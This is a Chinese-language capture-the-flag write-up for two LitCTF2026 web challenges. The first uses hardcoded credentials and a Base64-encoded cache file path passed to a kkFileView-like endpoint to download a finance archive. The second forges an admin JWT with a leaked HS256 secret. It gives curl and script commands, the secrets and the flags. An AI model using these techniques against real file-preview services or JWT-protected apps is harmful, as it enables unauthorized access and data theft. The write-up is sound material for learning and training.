# [LitCTF2026] Web WP

本文整理 LitCTF2026 的两道 Web 题，重点保留利用链、关键泄露点和可复现步骤，方便直接发布到博客。

---

## 1. Northbridge Document Hub

### 题目信息

- 分类：Web
- 题面摘要：文档中心接入了 kkFileView 兼容预览网关，研究员账号已开放，目标是从解析缓存里拿到财务归档中的 flag。

### 核心思路

这是一个典型的“先拿普通账号，再读缓存文件”的题。反编译 `northbridge_ROOT.war` 后，可以直接看到两条关键信息：

- 登录凭据是硬编码的：`researcher / Research#2026`
- 文件下载接口是 `/kkfileview/getCorsFile`，参数名为 `urlPath`

`urlPath` 先做 Base64 解码，再交给路径解析器；如果解码后的路径不是缓存绝对路径，就会被拼到 `/opt/kkfileview/cache/parsed` 下面。

### 利用步骤

#### Step 1: 登录后台

前端 `portal.js` 和后端 `LoginServlet` 都泄露了账号密码：

```text
researcher:Research#2026
```

#### Step 2: 定位目标文件

Dashboard 里能看到审计日志：

```text
doc/finance_2026q1.xlsx parse SUCCESS
```

结合“本季度财务归档”的题意，目标文件名就是：

```text
q1_finance_report_2026.zip
```

把它做 Base64：

```text
cTFfZmluYW5jZV9yZXBvcnRfMjAyNi56aXA=
```

#### Step 3: 读取缓存文件

```bash
curl -b cookies.txt -o q1_finance_report_2026.zip \
  "http://challenge.cyclens.tech:30720/kkfileview/getCorsFile?urlPath=cTFfZmluYW5jZV9yZXBvcnRfMjAyNi56aXA="
```

解压后读取 `flag.txt` 即可。

### Flag

```text
flag{44xcdrkv-wklf-4wj-8avx-axgvh0zjzvzc4}
```

### 关键点

- 前端 JS 直接泄露凭据和接口名
- 目标不在目录穿越，而在缓存目录拼接逻辑
- 只要猜对文件名，就能直接下载归档

---

## 2. lit_reverse_my_web

### 题目信息

- 分类：Web / Reverse
- 题面摘要：需要逆出服务端逻辑，再伪造管理员身份拿 `/flag`。

### 核心思路

这题的重点不是爆破 Web，而是逆服务端二进制。工作区里已经保留了现成利用脚本：

```text
lit_reverse_my_web/solve.py
```

脚本已经提取出 JWT 的 HS256 密钥：

```text
rMw_2026_litctf_jwt_secret_key!!
```

利用方式很直接：

1. 伪造 `role=admin` 的 token
2. 带 `Authorization: Bearer <token>` 请求 `/flag`

### 现成脚本

```bash
python lit_reverse_my_web/solve.py http://challenge.cyclens.tech:30273
```

### 关键字段

```json
{
  "role": "admin",
  "iss": "reverseMyWeb",
  "sub": "alice"
}
```

### 本地证据

- 题包：`lit_reverse_my_web/challenge.zip`
- 本地服务：`lit_reverse_my_web/src/server.exe`
- 利用脚本：`lit_reverse_my_web/solve.py`
